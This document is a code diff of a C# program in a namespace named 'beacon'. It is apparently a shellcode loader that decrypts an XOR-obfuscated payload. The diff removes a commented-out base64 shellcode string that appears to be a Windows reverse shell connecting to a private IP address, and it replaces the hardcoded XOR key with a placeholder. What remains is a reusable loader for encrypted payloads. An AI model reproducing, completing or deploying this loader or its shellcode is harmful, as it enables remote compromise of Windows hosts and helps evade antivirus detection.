@@ -168,10 +168,8 @@ namespace beacon
          public static void Main()
         {
 
-            //Add the shellcode
-            //string b64 = "/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAAG7wKgAe0FUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1VBQTTHJTTHASP/ASInCSP/ASInBQbrqD9/g/9VIicdqEEFYTIniSIn5QbqZpXRh/9VIgcRAAgAASbhjbWQAAAAAAEFQQVBIieJXV1dNMcBqDVlBUOL8ZsdEJFQBAUiNRCQYxgBoSInmVlBBUEFQQVBJ/8BBUEn/yE2JwUyJwUG6ecw/hv/VSDHSSP/Kiw5BugiHHWD/1bvwtaJWQbqmlb2d/9VIg8QoPAZ8CoD74HUFu0cTcm9qAFlBidr/1Q==";
             string xoredB64 = "REPLACE SHELLCODE HERE";
-            string xorKey = "SuperSecureKey";
+            string xorKey = "REPLACE XORKEY";
 
             byte[] shellcode = new byte[] { };
 
@@ -179,7 +177,7 @@ namespace beacon
 
             // Console.WriteLine($"XOR decrypted text: {shellcode}");
 
-            Console.WriteLine("shellcode is loaded: "+ Convert.ToBase64String(shellcode));
+            // Console.WriteLine("shellcode is loaded: "+ Convert.ToBase64String(shellcode));
 
             //shellcode = Convert.FromBase64String(b64);
 
